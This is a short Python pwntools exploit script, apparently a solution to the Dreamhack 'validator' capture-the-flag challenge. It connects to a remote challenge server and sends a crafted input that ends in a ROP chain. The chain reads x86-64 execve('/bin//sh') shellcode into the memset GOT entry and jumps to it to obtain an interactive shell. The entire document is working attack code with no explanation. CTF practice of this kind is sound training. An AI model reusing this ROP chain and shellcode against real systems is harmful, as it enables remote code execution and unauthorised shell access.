from pwn import *

# p = process("./validator_dist")
# nc host3.dreamhack.games 19726
p = remote("host3.dreamhack.games", 19726)
e = ELF("./validator_dist")

start = 118


shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

read_got = e.got['read']
read_plt = e.plt['read']

memset_got = e.got['memset']

p_rdi = 0x00000000004006f3 
p_rsi_r15 = 0x00000000004006f1
p_rdx = 0x000000000040057b

bss = 0x601050

pay_list = []

pay = b"DREAMHACK!"
# for i in range(0x80 - 11):
    # pay_list.append(start - i)
for i in range(118, 0, -1):
    # pay_list.append(i)
    pay += bytes([i])

# pay += bytearray(pay_list)

pay += p64(0) # sfp
pay += p64(p_rdi) # ret
pay += p64(0) # fd
pay += p64(p_rsi_r15) # ret
# pay += p64(bss) # buf
pay += p64(memset_got) # buf
pay += p64(0) # r15
pay += p64(p_rdx) # ret
pay += p64(0x50)
pay += p64(read_plt) # ret

# pay += p64(bss) # ret
pay += p64(memset_got) # ret

p.send(pay)
input()
p.send(shellcode)

input("1")


p.interactive()